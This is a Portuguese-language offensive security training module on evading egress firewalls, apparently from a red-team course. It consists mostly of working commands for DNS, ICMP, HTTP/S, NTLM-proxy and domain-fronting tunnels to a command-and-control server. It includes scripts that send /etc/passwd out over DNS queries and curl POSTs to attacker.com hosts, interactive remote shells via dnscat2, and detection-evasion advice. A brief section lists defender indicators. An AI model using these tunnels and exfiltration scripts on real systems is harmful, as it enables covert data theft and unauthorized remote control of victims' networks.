---
title: "Network Filters Bypass"
---

# Bypass de Filtros de Rede (Egress Filtering)

## Quando a Porta 4444 Não Passa, Use a 443

Egress filtering é um dos controles mais eficazes contra ataques que dependem de comunicação com infraestrutura externa. Quando um host está comprometido e o atacante tenta estabelecer shell reversa ou túnel de C2, o firewall simplesmente bloqueia todas as conexões de saída exceto pelas necessárias para o negócio.

Em ambientes corporativos maduros, apenas as seguintes portas costumam ter saída liberada: 80/TCP (HTTP), 443/TCP (HTTPS), 53/UDP e 53/TCP (DNS) — às vezes 8080, 8443, 587 (SMTP) e 123/UDP (NTP). Portas como 4444, 1337, 9999, 31337 (as "clássicas" de C2) são bloqueadas imediatamente. O atacante precisa adaptar a comunicação para usar os mesmos canais que o tráfego legítimo usa — e este documento cobre como identificar o que está disponível e como usar cada canal para criar comunicação com o C2.

---

## HTTP/S, DNS e ICMP Como Canais de C2

### Modelo Mental de Egress Filtering

```
[Host Comprometido]  ------>  [Firewall/Proxy]  ------>  [Internet/C2]

Firewall verifica:
- Porta de destino (80, 443 passam; 4444 bloqueia)
- Protocolo (TCP/UDP; ICMP às vezes bloqueado)
- Domínio destino (via DNS inspection ou categorização de URL)
- Volume/padrão de tráfego (DLP, anomaly detection)
```

### Por Que DNS É o Canal Mais Persistente

DNS é o protocolo de "último recurso" para exfiltração e tunelamento:

1. **Quase sempre liberado**: Sem resolução DNS, nada funciona. Mesmo as redes mais restritivas permitem consultas DNS.
2. **Encapsulamento invisível**: Dados podem ser codificados nos próprios nomes de domínio (subdomínios) das consultas.
3. **Volume "normal"**: Aplicações fazem centenas de consultas DNS por hora — dados exfiltrados se misturam ao tráfego normal.
4. **Controle do atacante**: O atacante controla um domínio e é o servidor DNS autoritativo para ele.

---

## Na Prática

### Passo 1: Identificar o Que Está Liberado

Antes de configurar qualquer túnel, é necessário mapear quais portas têm saída permitida.

```bash
# Método 1: ncat/nmap/netcat para testar portas
# Precisa de um host no Kali escutando em cada porta testada
# No Kali: nc -lvnp 80 &; nc -lvnp 443 &; nc -lvnp 53 &; etc.

ncat -zv KALI_IP 80
ncat -zv KALI_IP 443
ncat -zv KALI_IP 8080
ncat -zv KALI_IP 8443
ncat -zv KALI_IP 53
ncat -zv KALI_IP 22
ncat -zv KALI_IP 25
ncat -zv KALI_IP 3389

# Método 2: usar masscan DO host comprometido para escanear o Kali
# (O Kali deve estar escutando em todas as portas)
# No Kali: sudo python3 -m http.server 80 &; etc.
masscan -p1-65535 KALI_IP --rate 100 2>/dev/null

# Método 3: curl com timeout para teste de saída HTTP
curl -m 5 http://KALI_IP:80 && echo "80 ABERTO"
curl -m 5 http://KALI_IP:8080 && echo "8080 ABERTO"
curl -m 5 https://KALI_IP:443 -k && echo "443 ABERTO"

# Método 4: DNS lookup para confirmar saída UDP 53
nslookup KALI_DOMAIN KALI_IP
dig @KALI_IP teste.KALI_DOMAIN
# Se o Kali recebeu a query, DNS UDP 53 está liberado para fora

# Método 5: ping para testar ICMP
ping -c 3 KALI_IP
# Se funcionar, ICMP está liberado (raro em ambientes corporativos)
```

**Interpretar resultado:**

| Porta Aberta | Canal Disponível               | Ferramenta Recomendada       |
|--------------|--------------------------------|------------------------------|
| 443 (HTTPS)  | Melhor opção — encriptado      | Ligolo-ng, Chisel TLS        |
| 80 (HTTP)    | Bom — WebSocket disponível     | Chisel, Ligolo                |
| 53 (DNS)     | Último recurso — lento         | iodine, dnscat2              |
| 22 (SSH)     | Excelente se disponível        | SSH tunnels                  |
| ICMP         | Lento mas alternativo          | ptunnel-ng                   |
| 8080/8443    | Proxy alternativo              | Chisel, Ligolo               |

---

### 2. DNS Tunneling

DNS tunneling encapsula dados em consultas e respostas DNS. O payload é codificado como subdomínios: `DADOS_BASE32.attacker.com`. O servidor DNS autoritativo para `attacker.com` é o Kali, que decodifica os dados.

**Limitações:**
- Lento (limitado a ~1-3 KB/s típico)
- Latência alta
- Pode ser detectado por análise de volume de consultas DNS ou comprimento incomum de subdomínios

#### Iodine — Cria Interface de Rede sobre DNS

iodine cria uma interface de rede real (dns0) sobre DNS, permitindo roteamento completo de IP.

**Pré-requisito:** Ter um domínio com NS record apontando para o Kali.

```
# No DNS do domínio attacker.com:
# tunnel.attacker.com    NS    ns1.attacker.com
# ns1.attacker.com       A     KALI_IP
```

```bash
# === KALI (servidor iodine) ===
# Instalar
apt-get install iodine

# Iniciar servidor iodine
# -f: ficar em foreground
# -c: desabilitar verificacao de IP do cliente (util com NAT)
# -P: senha de autenticacao
# 10.0.0.1: IP da interface interna do servidor
# tunnel.attacker.com: subdomínio autoritativo
sudo iodined -f -c -P senha_secreta 10.0.0.1 tunnel.attacker.com

# Verificar interface criada
ip addr show dns0
# inet 10.0.0.1/27

# === HOST COMPROMETIDO (cliente iodine) ===
# Instalar se possível
apt-get install iodine
# ou compilar estaticamente e transferir

# Conectar ao servidor
sudo iodine -f -P senha_secreta tunnel.attacker.com
# Aguardar: "Connection setup complete, transmitting data."

# Interface dns0 criada com IP 10.0.0.2
ip addr show dns0
ping 10.0.0.1  # testar conectividade com o Kali

# Agora usar o túnel como qualquer outra rota
# SSH via dns0: ssh user@10.0.0.1
# Pode usar como pivot para outros tuneis por cima (chisel via ssh via dns0)
```

**Otimizar iodine:**

```bash
# Verificar MTU ideal
sudo iodine -f -P senha_secreta -m 200 tunnel.attacker.com

# Usar modo lazy (mais eficiente, menos consultas)
sudo iodine -f -P senha_secreta -L 1 tunnel.attacker.com

# Debug para diagnóstico
sudo iodine -f -P senha_secreta -v tunnel.attacker.com
```

#### dnscat2 — Shell Interativa sobre DNS

dnscat2 cria um canal de controle e exfiltração sobre DNS, com sessões interativas.

```bash
# === KALI (servidor dnscat2) ===
# Instalar dependências
gem install bundler
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
bundle install

# Iniciar servidor — aceitar conexões via DNS para attacker.com
ruby dnscat2.rb --dns domain=attacker.com --no-cache

# Se não tiver domínio (direto via IP, menos furtivo):
ruby dnscat2.rb --dns host=KALI_IP,port=5353,type=TXT

# === HOST COMPROMETIDO (cliente dnscat2) ===
# Baixar ou compilar cliente
wget https://github.com/iagox86/dnscat2/releases/download/v0.07/dnscat2-v0.07-client-linux.tar.gz

# Conectar usando domínio
./dnscat2 attacker.com

# Sem domínio (apontando direto para servidor DNS do Kali)
./dnscat2 --dns host=KALI_IP,port=53

# Com segredo para autenticação
./dnscat2 --secret=senha_secreta attacker.com

# === KALI — Usar a sessão ===
# No terminal do servidor dnscat2:
dnscat2> sessions
dnscat2> session -i 1   # selecionar sessão 1
command (HOSTNAME) 1> shell  # criar canal de shell
dnscat2> session -i 2   # sessão da shell
command (HOSTNAME) 2> exec cmd.exe   # Windows
command (HOSTNAME) 2> exec /bin/bash # Linux

# Criar listeners para port forwarding via dnscat2
command (HOSTNAME) 1> listen 0.0.0.0:4444 INTERNAL_IP:80
```

---

### 3. ICMP Tunneling

ICMP (ping) pode carregar payload nos bytes de dados do pacote. Funciona em redes que permitem ICMP mas não TCP/UDP para fora.

#### ptunnel-ng

```bash
# Instalar ptunnel-ng
apt-get install ptunnel-ng
# ou compilar:
git clone https://github.com/lnslbrty/ptunnel-ng.git && cd ptunnel-ng && cmake . && make

# === KALI (servidor) ===
# Iniciar servidor ptunnel
sudo ptunnel-ng

# === HOST COMPROMETIDO (cliente) ===
# Redirecionar porta local via ICMP para o Kali
# -R: endereço do servidor ptunnel (Kali)
# -r: host de destino do forward (pode ser diferente do Kali)
# -rp: porta de destino
# -lp: porta local que vai escutar
sudo ptunnel-ng -R KALI_IP -r INTERNAL_HOST -rp 80 -lp 8080
# Agora acessar localhost:8080 no host comprometido -> INTERNAL_HOST:80 via ICMP

# Criar tunnel para SSH
sudo ptunnel-ng -R KALI_IP -r KALI_IP -rp 22 -lp 2222
ssh -p 2222 user@127.0.0.1   # SSH para Kali via ICMP

# Com senha para autenticação
sudo ptunnel-ng -R KALI_IP -x senha_tunnel   # servidor
sudo ptunnel-ng -R KALI_IP -lp 8080 -r TARGET -rp 80 -x senha_tunnel  # cliente
```

---

### 4. HTTP/HTTPS Tunneling

Se portas 80 ou 443 estão abertas, esta é a melhor opção — alta largura de banda, encriptado (HTTPS), e se mistura ao tráfego legítimo.

```bash
# Chisel via HTTPS (preferido) - ver 03_pivoting_e_tunelamento.md
./chisel server -p 443 --tls-key key.pem --tls-cert cert.pem --reverse

# Ligolo-ng via TLS na porta 443
./proxy -selfcert -laddr 0.0.0.0:443

# No host comprometido:
./agent -connect KALI_IP:443 -ignore-cert
```

**Usar certificado válido para evitar alertas de TLS inspection:**

```bash
# Se a rede faz TLS inspection (MITM corporativo), certificados autoassinados
# serão detectados como anomalia. Usar certificado Let's Encrypt:

# No Kali (requer domínio apontado para Kali_IP):
certbot certonly --standalone -d c2.attacker.com
# Certificados em: /etc/letsencrypt/live/c2.attacker.com/

# Chisel com certificado válido
./chisel server -p 443 \
  --tls-key /etc/letsencrypt/live/c2.attacker.com/privkey.pem \
  --tls-cert /etc/letsencrypt/live/c2.attacker.com/fullchain.pem \
  --reverse
```

---

### 5. Proxy Corporativo Autenticado (NTLM)

Em redes corporativas, todo tráfego HTTP/HTTPS frequentemente passa por um proxy autenticado via NTLM ou Kerberos. Sem autenticar no proxy, nenhuma conexão de saída funciona — mesmo na porta 443.

**Identificar o proxy corporativo:**

```bash
# WPAD (Web Proxy Auto-Discovery)
curl http://wpad/wpad.dat
curl http://wpad.DOMINIO.LOCAL/wpad.dat

# Via variáveis de ambiente (usuário pode ter configurado)
echo $http_proxy
echo $https_proxy
echo $HTTP_PROXY

# Via registro no Windows
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable

# Verificar configurações do Internet Explorer (ainda usadas pelo sistema)
netsh winhttp show proxy

# Via PowerShell
[System.Net.WebRequest]::GetSystemWebProxy().GetProxy("http://google.com")
```

#### cntlm — Proxy Local que Autentica via NTLM

cntlm é um proxy local que recebe conexões sem autenticação e as repassa autenticando via NTLM no proxy corporativo.

```bash
# Instalar cntlm
apt-get install cntlm
# Windows: baixar de http://cntlm.sf.net

# === CONFIGURAR /etc/cntlm.conf ===
nano /etc/cntlm.conf

# Conteúdo relevante:
# Username    johndoe
# Domain      CORPORATE
# Password    (não usar em texto claro — usar hash gerado abaixo)
# Proxy       proxy.corporate.com:8080
# Listen      3128

# Gerar hash NTLM da senha (não deixar senha em texto claro no config)
cntlm -H -u johndoe -d CORPORATE
# Password:
# PassLM     AAD3B435B51404EEAAD3B435B51404EE
# PassNT     HASH_NT_AQUI
# PassNTLMv2 HASH_NTLMv2_AQUI

# Adicionar ao cntlm.conf:
# PassNTLMv2   HASH_NTLMv2_AQUI
# Auth         NTLMv2

# Testar configuração
cntlm -v -c /etc/cntlm.conf -f http://google.com

# Iniciar cntlm
cntlm -l 127.0.0.1:3128 -c /etc/cntlm.conf

# === USAR COM PROXYCHAINS ===
# Editar /etc/proxychains.conf:
# socks4 127.0.0.1 3128

# Ou via variáveis de ambiente
export http_proxy=http://127.0.0.1:3128
export https_proxy=http://127.0.0.1:3128
curl https://attacker.com

# === USAR COM CHISEL ATRAVÉS DO PROXY CNTLM ===
./chisel client --proxy http://127.0.0.1:3128 KALI_DOMAIN:443 R:socks
```

---

### 6. Domain Fronting via CDN

Domain fronting usa uma CDN (Content Delivery Network) como intermediário. A conexão TLS vai para um domínio legítimo da CDN (SNI), mas o header HTTP Host aponta para o C2 real. A CDN encaminha a requisição para o servidor de origem configurado (o C2).

**Por que funciona:**

```
[Host Comprometido]
    |
    |--> TLS SNI: allowed-cdn-domain.cloudfront.net  (passa pelo firewall — legítimo)
    |    HTTP Host: c2.attacker.com                   (só visível após decriptação TLS)
    |
[CloudFront CDN]
    |
    |--> Encaminha para origem: c2.attacker.com
    |
[C2 real do atacante]
```

**Configuração com AWS CloudFront:**

```bash
# 1. No Kali (C2): configurar servidor HTTPS na porta 443

# 2. Na AWS: criar distribuição CloudFront
#    - Origin: c2.attacker.com (seu C2 real)
#    - Domínio CloudFront gerado: XXXX.cloudfront.net
#    - Ou usar domínio permitido que já existe na mesma CDN

# 3. No host comprometido — fazer requisição com Host header diferente do SNI
curl -k \
  --resolve "ALLOWED-DOMAIN.cloudfront.net:443:CLOUDFRONT_IP" \
  -H "Host: c2.attacker.com" \
  https://ALLOWED-DOMAIN.cloudfront.net/beacon

# 4. Via Cobalt Strike — configurar malleable C2 profile com domain fronting:
# Em c2profile.c2:
# https-get {
#   client {
#     header "Host" "c2.attacker.com";
#   }
# }
# ./teamserver KALI_IP password c2profile.c2

# NOTA: CloudFront e outros CDNs têm progressivamente bloqueado domain fronting
# Alternativa moderna: usar CDNs que ainda permitem (Fastly, alguns Azure CDN configs)
```

---

### 7. Exfiltração Low-and-Slow

Quando o volume de dados é monitorado (DLP, UEBA), é necessário exfiltrar lentamente e em pequenos fragmentos para não disparar alertas.

```bash
# Exfiltração via DNS (mais lento, mais furtivo)
# Cada consulta DNS carrega ~63 bytes por subdomínio label
# Encodar dados em base32 (compatível com DNS)

# Exemplo manual:
DATA=$(cat /etc/passwd | base64 | tr '+/=' '-_.' | head -c 63)
dig $DATA.exfil.attacker.com @KALI_IP

# Script de exfiltração low-and-slow via DNS
#!/bin/bash
file=$1
server=$2
chunk_size=60
counter=0
while IFS= read -r -n $chunk_size chunk; do
    encoded=$(echo -n "$chunk" | xxd -p | tr -d '\n')
    dig ${counter}.${encoded}.exfil.${server} @${server} > /dev/null 2>&1
    sleep 5  # delay entre consultas para evitar anomaly detection
    ((counter++))
done < "$file"

# No servidor Kali, capturar consultas DNS e reassemblar:
tcpdump -i eth0 -w /tmp/dns_capture.pcap 'udp port 53' &
# Depois analisar:
tshark -r /tmp/dns_capture.pcap -Y "dns.qry.name contains exfil" -T fields -e dns.qry.name

# Exfiltração via HTTP com throttling
curl --limit-rate 10k -X POST \
     -H "Content-Type: application/octet-stream" \
     --data-binary @/etc/passwd \
     https://c2.attacker.com/upload

# Exfiltração via HTTPS em chunks com delay
split -b 1k /etc/passwd /tmp/chunk_
for chunk in /tmp/chunk_*; do
    curl -s -X POST https://c2.attacker.com/data \
         --data-binary @$chunk \
         -H "X-Session: $(hostname)"
    rm $chunk
    sleep $((RANDOM % 30 + 10))  # delay aleatório entre 10-40 segundos
done
```

---

## Exemplos de Código / Comandos

### Script de Descoberta de Egress Completa

```bash
#!/bin/bash
# egress_discovery.sh — testar portas de saída no host comprometido

KALI="C2_IP_OU_DOMINIO"
PORTAS="21 22 25 53 80 110 143 443 445 587 993 1080 3128 3306 3389 5985 8080 8443 8888 9090 10000"

echo "[*] Testando portas de saída para $KALI"
echo ""

for porta in $PORTAS; do
    resultado=$(timeout 3 bash -c "echo >/dev/tcp/$KALI/$porta" 2>/dev/null && echo "ABERTA" || echo "fechada")
    if [ "$resultado" == "ABERTA" ]; then
        echo "[+] Porta $porta: ABERTA"
    fi
done

echo ""
echo "[*] Teste DNS"
if nslookup $KALI > /dev/null 2>&1; then
    echo "[+] DNS para $KALI funcionando"
fi

echo ""
echo "[*] Teste ICMP"
if ping -c 1 -W 2 $KALI > /dev/null 2>&1; then
    echo "[+] ICMP (ping) para $KALI funcionando"
else
    echo "[-] ICMP bloqueado"
fi
```

### Decisão Automática de Canal (Pseudocódigo Operacional)

```
SE 443 aberto:
    Usar Chisel com TLS ou Ligolo-ng
    Preferir certificado válido se proxy inspeciona TLS

SENÃO SE 80 aberto:
    Usar Chisel HTTP
    Considerar WebSocket para manter conexão estável

SENÃO SE 22 aberto:
    Usar SSH tunnel direto
    ssh -D 1080 user@KALI_IP -N

SENÃO SE 53 aberto (UDP):
    Configurar iodine ou dnscat2
    Lento — usar para C2 básico apenas, não para transferência de dados grande

SENÃO SE ICMP funciona:
    Usar ptunnel-ng
    Muito lento — emergência

SENÃO:
    Investigar se há proxy corporativo (WPAD)
    Configurar cntlm
    Domain fronting como último recurso
```

### Setup Rápido C2 via DNS (dnscat2 sem domínio)

```bash
# === KALI ===
# Servir dnscat2 direto via UDP 5353 (sem precisar de domínio)
ruby dnscat2.rb --dns host=0.0.0.0,port=5353,type=TXT --secret=TOKEN

# Se porta 53 precisar: (requer root)
sudo ruby dnscat2.rb --dns host=0.0.0.0,port=53,type=TXT --secret=TOKEN

# === HOST COMPROMETIDO ===
# Conectar direto ao servidor Kali
./dnscat2 --dns host=KALI_IP,port=53 --secret=TOKEN

# === KALI — Comandos na sessão ===
dnscat2> session -i 1
command (host) 1> shell
dnscat2> session -i 2
# Agora tem shell interativa!
```

---

## Detecção e OPSEC

### O que os Defensores Procuram

**DNS Tunneling:**
- Nomes de domínio muito longos (subdomínios com 50+ caracteres = suspeito)
- Alta frequência de consultas para um único domínio
- Domínios com alto índice de entropia no nome (base32/base64 parecem "aleatórios")
- Respostas DNS de tamanho incomum (TXT records com muitos dados)
- Consultas para domínios recém-registrados

**HTTP/HTTPS Tunneling:**
- Conexões persistentes de longa duração (WebSocket por horas = suspeito)
- Volume de upload incomum (host de workstation enviando GB via HTTPS)
- User-agent strings incomuns ou ausentes
- Timing de beaconing regular (ex: exatamente a cada 60 segundos)
- SNI/Host header inconsistência (domain fronting)

**ICMP Tunneling:**
- Pacotes ICMP com payload grande (além dos 32-56 bytes padrão)
- Alto volume de ICMP de um único host
- ICMP fora do padrão (tipo/código incomum)

### Técnicas para Reduzir Detecção

```bash
# 1. Jitter no beaconing (C2 com variação aleatória de intervalo)
# Cobalt Strike: set sleeptime "60000"; set jitter "30";
# Isso: sleep aleatório entre 42-78 segundos em vez de exatamente 60

# 2. User-Agent legítimo
# Imitar User-Agent de browser comum
curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36" \
     https://c2.attacker.com/

# 3. Mascarar tráfego DNS em volume normal
# dnscat2: usar modo com delay entre pacotes
./dnscat2 --dns host=KALI_IP,port=53 --secret=TOKEN --max-retransmits 3

# 4. Limitar taxa de transferência
# Chisel: usar flags para limitar bandwidth se suportado
# Alternativa: adicionar sleeps entre operações

# 5. Usar domínios com reputação (categorização de URL)
# CDNs conhecidas (cloudfront.net, azureedge.net) têm boa reputação
# Proxies corporativos raramente bloqueiam esses domínios

# 6. Operar em horário comercial
# Tráfego às 3h da manhã de um servidor é suspeito
# Tráfego às 14h num workstation se mistura ao tráfego normal

# 7. Inspecionar o que os defensores podem ver
# Verificar se há TLS inspection: acessar https://badssl.com/dashboard
# Se certificados autoassinados geram alertas = TLS inspection habilitado
```

---

## Módulos Relacionados

`03_pivoting_e_tunelamento.md` é o contexto direto — assume que o canal de saída já está estabelecido e descreve como rotear tráfego interno pelo pivot. `../02_c2_infraestrutura/03_malleable_c2_profiles.md` cobre como configurar o beacon para imitar tráfego HTTP/S legítimo e passar por proxies corporativos com TLS inspection. ATT&CK T1572 (Protocol Tunneling), T1071.004 (DNS), T1071.001 (Web Protocols) e T1090.004 (Domain Fronting) mapeiam as técnicas desta nota.
- **ptunnel-ng** — https://github.com/lnslbrty/ptunnel-ng
- **cntlm** — http://cntlm.sf.net
- **Módulo anterior**: `03_pivoting_e_tunelamento.md` — ferramentas de pivot que dependem de portas abertas
- **Módulo relacionado**: `../07_pos_exploracao_linux/01_linux_post_exploitation.md` — identificar informações de rede no host comprometido
- **Módulo relacionado**: `../07_pos_exploracao_linux/03_kiosk_breakouts.md` — após breakout, pode haver filtros de egress a superar
